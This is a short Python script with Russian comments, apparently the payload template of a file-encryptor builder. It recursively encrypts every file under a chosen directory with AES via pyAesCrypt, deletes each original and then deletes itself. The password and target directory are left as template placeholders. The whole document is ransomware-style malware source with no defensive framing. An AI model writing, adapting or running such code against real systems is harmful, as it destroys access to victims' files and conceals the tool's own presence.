import os
import sys


def crypt(file):  # функция шифрования
    import pyAesCrypt
    print("----------------------------------------------------------")
    password = "'''+str(password)+'''"  # присваиваем пароль
    buffer_size = 512*1024  # пишем размер буфера (512 Kb)
    pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, buffer_size)  # стандартная функция шифрования
    print("[Encrypt] '"+str(file)+".crp'")  # выводим сообщение об успешной зашифровке
    os.remove(file)  # удаляем исходный файл


def walk(dir):  # функция перехода по папкам
    for name in os.listdir(dir):  # перебор всех папок в директории
        path = os.path.join(dir, name)
        if os.path.isfile(path):  # если файл, ...
            crypt(path)  # ... шифруем
        else:  # если папка, ...
            walk(path)  # ... заходим в неё и повторяем


walk("'''+str(direct)+'''")  # вводим директорию
print("----------------------------------------------------------")
os.remove(str(sys.argv[0]))  # удаляем файл программы
